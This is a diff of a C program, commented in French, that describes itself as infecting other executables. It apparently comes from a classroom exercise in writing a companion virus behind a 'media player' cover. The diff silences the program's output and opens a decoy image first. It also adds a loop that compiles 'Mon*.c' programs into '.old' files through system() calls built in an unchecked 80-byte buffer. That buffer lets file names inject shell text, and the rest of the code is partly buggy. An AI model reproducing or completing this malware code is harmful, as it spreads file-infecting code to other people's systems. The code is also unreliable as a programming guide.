@@ -10,6 +10,15 @@
 char** getFiles();
 void infecte(char** f);
 bool dejaInfecte(char* f);
+char* getExtension(char* f);
+
+/**
+ * Fonction pour récupérer l'extension d'un fichier
+ */
+char* getExtension(char* f){
+    char* dot = strrchr(f, '.');
+    return (!dot || dot == f) ? "" : dot+1;
+}
 
 /**
  * Fonction permettant de récupérer les noms des fichiers à infecter
@@ -20,7 +29,7 @@ char** getFiles(){
     DIR *repertoire = opendir("."); // Ouverture du répertoire courant pour parcourir les fochiers
     struct stat statsF; // Obtenir les statistiques d'un fichier
     struct dirent *lecture; // Obtenir le fichier courant
-    printf("Liste des fichiers exécutables : \n");
+    //printf("Liste des fichiers exécutables : \n");
     while((lecture = readdir(repertoire))){
         /**
          * Lecture du répertoire
@@ -33,7 +42,7 @@ char** getFiles(){
                 /**
                  * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
                  */
-                printf("- %s\n", lecture->d_name);
+                //printf("- %s\n", lecture->d_name);
                 files[cpt] = lecture->d_name;
                 cpt++;
             }
@@ -50,17 +59,59 @@ char** getFiles(){
  */
 void infecte(char** f){
     /**
-     * Parcours pour 5 fichiers (les programmes MonPGn)
+     * Parcours le répertoire courant, et compile les programmes monPGn avec l'extension .old
      */
-    for(int i = 0; i < 5; i++)
-    {
-		FILE *oldFile;
-		FILE *newFile;
-		char* currentFile = f[i];
-		strcat(currentFile, ".old");
-		printf("%s\n", currentFile);
+    DIR *rep = opendir(".");
+    char* monPG;
+    char* mediaPlayer;
+    char* monPGNoExtension = NULL;
+    if (rep!= NULL) {
+        struct dirent *lecture;
+        /**
+         * Lecture des fichiers .c du répertoire afin de créer les executables .old apres infection
+         */
+        while((lecture = readdir(rep))){
+            char* ext = getExtension(lecture->d_name);
+            /**
+             * Si l'extension du fichier est .c et que le nom du fichier commence par "Mon"
+             */
+            if ((strcmp(ext, "c") == 0) && (strncmp(lecture->d_name, "Mon", 3) == 0)) {
+                monPG = lecture->d_name;
+                monPGNoExtension = calloc(sizeof(monPG), 1);
+                strncat(monPGNoExtension, monPG, sizeof(monPG)-2); // Nom du programme sans l'extension
+
+                /**
+                 * Création de la commande gcc
+                 */
+                char commande[80];
+                strcpy(commande, "gcc -Wall ");
+                strcat(commande, monPG);
+                strcat(commande, " -o ");
+                strcat(commande, monPGNoExtension);
+                strcat(commande, ".old");
+                system(commande); // Execution de la commande
+            }
+
+
+        }
+        closedir(rep);
     }
 
+    /*for(int i = 0; i < 5; i++)
+    {   
+        FILE *mediaPlayer;
+		FILE *oldFile;
+		FILE *newFile;
+
+        char fileWithOld[strlen(f[i])+strlen(".old")];
+		char currentFile[strlen(f[i])];
+
+        strcpy(currentFile, f[i]);
+        strcpy(fileWithOld, strcat(f[i], ".old"));
+        rename(f[i], fileWithOld);
+
+        mediaPlayer = fopen("MediaPlayer.c", "r");
+    }*/
 }
 
 
@@ -96,8 +147,8 @@ bool dejaInfecte(char* f){
  */
 int main(int argc, char const *argv[])
 {
+    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
     char** files = getFiles(); // Récupération des fichiers à infecter
     infecte(files); // Infection des fichiers
-    system("xdg-open ../img/img1.jpg"); //Ouverture du système d'affichage d'images Linux grâce à la commande système qui permet d'executer des commandes bash
     return EXIT_SUCCESS;
 }
